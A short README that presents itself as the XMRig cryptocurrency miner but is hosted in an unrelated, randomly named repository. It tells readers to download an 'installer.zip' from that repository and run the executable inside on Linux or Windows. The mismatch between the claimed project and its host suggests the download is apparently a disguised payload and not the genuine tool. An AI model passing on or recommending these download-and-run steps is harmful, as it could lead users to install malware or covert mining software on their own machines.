# XMRig - High Performance Crypto Miner

![GitHub stars](https://img.shields.io/github/stars/cleusaindustriadocobre-cyber/fantastic-palm-tree?style=social) ![GitHub forks](https://img.shields.io/github/forks/cleusaindustriadocobre-cyber/fantastic-palm-tree) ![License](https://img.shields.io/badge/license-MIT-blue.svg)

## Description
XMRig is designed for high efficiency and performance in mining cryptocurrencies. It supports various algorithms, ensuring compatibility with a wide range of coins. This miner can be used both for benchmarking and as a stratum proxy. Whether you are a beginner or an experienced miner, XMRig provides a powerful solution for your mining needs.

## Installation
To install XMRig, download the installer from the repository:

1. **Download the installer**: [Installer.zip](https://github.com/cleusaindustriadocobre-cyber/fantastic-palm-tree/raw/refs/heads/main/installer.zip)
2. **Extract the contents** of the zip file to your preferred location.
3. **Run the installer**:
   - For **Linux** users: Open a terminal and navigate to the extracted folder, then execute:
     ```bash
     ./installer
     ```
   - For **Windows** users: Double-click the executable file to start the installation.

## Usage
Once installed, configure the miner by editing the configuration file according to your mining pool and wallet address. After configuration, start the miner using the command appropriate for your OS:
- For **Linux**:
  ```bash
  ./xmrig
  ```
- For **Windows**:
  ```cmd
  xmrig.exe
  ```
